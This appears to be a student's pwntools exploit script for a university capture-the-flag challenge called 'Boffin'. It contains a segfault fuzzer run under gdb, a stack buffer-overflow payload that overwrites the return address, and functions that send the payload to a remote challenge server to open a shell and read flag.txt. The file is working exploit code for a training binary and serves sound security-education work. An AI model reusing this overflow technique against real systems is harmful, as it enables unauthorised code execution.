from pwn import *
import re
import struct

#############################################################
#	Boffin_Pwn.py											#
#	Lindsay Von Tish (lmv9443@nyu.edu)						#
#	Pwn 1: Boffin											#
#	02/28/2024												#
#############################################################

# A function to convert encoded input to a string and remove text format characters
#	Input: Encoded string
#	Output: Unencoded string
def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

# A function to print register values
#	Input: Connection
#	Output: N/A
def getRegisters(p):
	p.sendline("info registers")
	data = p.recvuntil("(gdb)")
	print(data)


# A function to see how much input it takes for a segfault
#	Input: Connection
#	Output: N/A
def segFuzz():
	p =  process('/bin/bash')
	p.sendline('gdb ./boffin -q')
	p.recv()
	n = 0
	base = b"".join([struct.pack("B", 0x41) for i in range(0,31)])
	while True:
		data = base + b"".join([struct.pack("B", 0x41) for i in range(0,n)])
		p.sendline("r")
		p.sendline(data)
		p.recvuntil("Hi")
		p.recvline()
		if(re.search("exited normally", cleanLine(p.recvline()))):
			n += 1
			#data += chars[n]*8 
			print(n)
		else:
			print(cleanLine(p.recvline()))
			#p.recvuntil("Segmentation fault.")
			#print(p.recvline())
			p.recvuntil("(gdb)")
			p.sendline("info registers rip")
			ln = cleanLine(p.recvline())
			l = re.split("\s+", ln)
			print(l[2])
			if n == 20:
				p.interactive()
			else:
				n +=1
				print(n)
	print(data)	

# A function to build the payload to exploit Boffin
#	Input: N/A
#	Output: String containing payload
def buildPayload():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,40)])
	#print(base)
	data = b"".join([struct.pack("B", 0x9d), struct.pack("B", 0x06), struct.pack("B", 0x40), struct.pack("B", 0x00), struct.pack("B", 0x00)])
	#print(base + data)
	return base + data


# A function to build the payload to exploit Boffin locally
#	Input: N/A
#	Output: String containing payload
def buildSafePld():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,40)])
	#print(base)
	retAddr = b"".join([struct.pack("B", 0x1a), struct.pack("B", 0x07), struct.pack("B", 0x40), struct.pack("B", 0x00), struct.pack("B", 0x00)])
	data = b"".join([struct.pack("B", 0x9d), struct.pack("B", 0x06), struct.pack("B", 0x40), struct.pack("B", 0x00), struct.pack("B", 0x00)])
	pad = b"".join([struct.pack("B", 0x00) for i in range(0,3)])
	#print(base + data)
	return base + retAddr + pad + data

# A function to send a payload to the process and open an interactive shell
#	Input: Connection
#	Output: N/A
def getShell(p):
	payload = buildPayload()
	p.recvuntil("Hey! What's your name?")
	p.sendline(payload)
	p.interactive()

# A function to send a payload to the remote challenge then get the flag
#	Input: Connection
#	Output: Flag string
def getFlag(p):
	payload = buildPayload()
	p.recvuntil("Hey! What's your name?")
	p.sendline(payload)
	p.recvuntil("Hi")
	p.recvline()
	p.sendline("cat flag.txt")
	return cleanLine(p.recvline())


# A function to send a payload to the process and open an interactive shell
#	Input: Connection
#	Output: N/A
def getSafeShell(p):
	payload = buildSafePld()
	p.recvuntil("Hey! What's your name?")
	p.sendline(payload)
	p.interactive()

# A function to attack a local instance of boffin running with gdb and print the crash info
# 	Currently segfaults
#	Input: N/A
#	Output: N/A
def pwnGDB():
	# Start gdb session
	p =  process('/bin/bash')
	p.sendline('gdb ./boffin -q')
	p.sendline("break *0x0000000000400719")
	p.sendline("break *0x000000000040071a")
	p.sendline("r")
	#p.recv()
	getSafeShell(p)
	#cf = p.corefile
	#stack = cf.rsp


# A function to attack a local instance of boffin
# 	Currently segfaults
#	Input: N/A
#	Output: N/A
def pwnLocal():
	# Start local instance
	p =  process('./boffin')
	getSafeShell(p)


# Host and port for the remote challenge
HOST = 'offsec-chalbroker.osiris.cyber.nyu.edu'
PORT = 1337

# A function to get the flag from a remote instance of boffin
# 	Currently functional
#	Input: N/A
#	Output: N/A
def pwnRemote():
	# Start remote session
	p = remote(HOST, PORT)
	print(getFlag(p))
	p.close()

# A function to get a shell from a remote instance of boffin
# 	Currently functional
#	Input: N/A
#	Output: N/A
def shellRemote():
	# Start remote session
	p = remote(HOST, PORT)
	#getShell(p)
	getSafeShell(p)


# Uncomment for function
# pwnRemote()
# shellRemote()
# pwnLocal()
# pwnGDB()
# segFuzz()

